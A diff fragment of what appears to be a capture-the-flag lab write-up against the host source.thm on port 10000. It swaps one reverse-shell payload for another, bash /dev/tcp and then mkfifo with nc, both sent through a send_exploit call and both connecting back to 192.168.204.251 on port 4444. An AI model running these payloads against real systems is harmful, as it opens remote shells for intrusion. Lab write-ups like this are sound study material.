@@ -84,8 +84,8 @@ def send_exploit(target, port, command):
     return response
 
 
-r = send_exploit("http://source.thm", 10000, "bash -i >& /dev/tcp/192.168.204.251/4444 0>&1")
-print(f"[+] Done — {r.status_code}")
+r = send_exploit("http://source.thm", 10000, "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.204.251 4444 >/tmp/f")
+print(f"[*] Response:\n{r.text}")
 ```
 
 ### Listener
